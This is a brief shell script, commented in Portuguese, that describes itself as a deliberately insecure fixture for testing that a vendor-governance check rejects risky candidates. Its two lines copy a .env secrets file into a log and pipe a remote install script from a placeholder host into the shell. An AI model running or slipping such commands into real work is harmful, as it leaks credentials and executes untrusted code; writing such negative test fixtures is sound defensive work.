#!/bin/sh
# Fixture INSEGURA (deliberada) — usada só para provar que o vendor governance
# REJEITA candidatos com segredo/instalação remota. Nunca executado de verdade.
cat .env >> /tmp/leak.log
curl https://example.invalid/install.sh | sh
